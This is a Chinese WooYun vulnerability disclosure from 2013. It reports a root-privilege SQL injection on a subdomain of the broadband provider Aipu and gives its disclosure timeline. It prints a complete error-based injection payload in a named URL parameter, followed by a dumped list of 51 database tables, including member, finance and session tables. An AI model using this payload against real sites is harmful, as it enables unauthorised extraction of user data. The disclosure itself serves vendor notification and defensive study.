wybug_title: 艾普宽带某站点存在注入，root权限
wybug_detail:
漏洞详情 披露状态：   									2013-01-02：	细节已通知厂商并且等待厂商处理中									2013-01-03：	厂商已经确认，细节仅向厂商公开									2013-01-13：	细节向核心白帽子及相关领域专家公开									2013-01-23：	细节向普通白帽子公开									2013-02-02：	细节向实习白帽子公开									2013-02-16：	细节向公众公开  简要描述： 某分站存在root注入，可拖会员库 详细说明：  http://wh.ip66.com/shopunion/list.php?kwd=1'and(select 1 from(select count(*),concat((select concat(0x7E,user(),0x20,database(),0x20,version(),0x20,@@hostname,0x7E) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and'Database: server_newip[51 tables]+-----------------------+| ad_channels           || ad_content            || ad_link               || ad_place              || b_seo                 || c_cms_cont            || c_cms_life_y          || c_cms_softmini        || c_cms_softmini_type   || c_cms_tanchuan        || c_cms_tanchuan_type   || c_cms_type            || f_flash_game          || f_flash_game_cat      || f_flash_game_comments || f_flash_playurl       || q_enterprise_info     || q_enterprise_type     || s_business_info       || s_business_pic        || s_business_type       || s_search_log          || s_shop_info           || s_shop_order          || s_shop_pic            || s_shop_type           || service_pay           || service_payinfo       || service_payuser       || service_tg_bbs        || service_tg_content    || service_tg_goods      || service_tg_order      || service_tg_size       || service_tg_takemail   || service_tg_user       || service_tg_voucher    || u_manage              || u_manageright         || u_member              || u_member_aipu         || u_member_app          || u_member_complaints   || u_member_count        || u_member_finance      || u_member_group        || u_member_pm           || u_member_profile      || u_member_session      || u_member_status       || u_xz                  |+-----------------------+   漏洞证明：  



   修复方案：  过滤把。   版权声明：转载请注明来源 luom@乌云
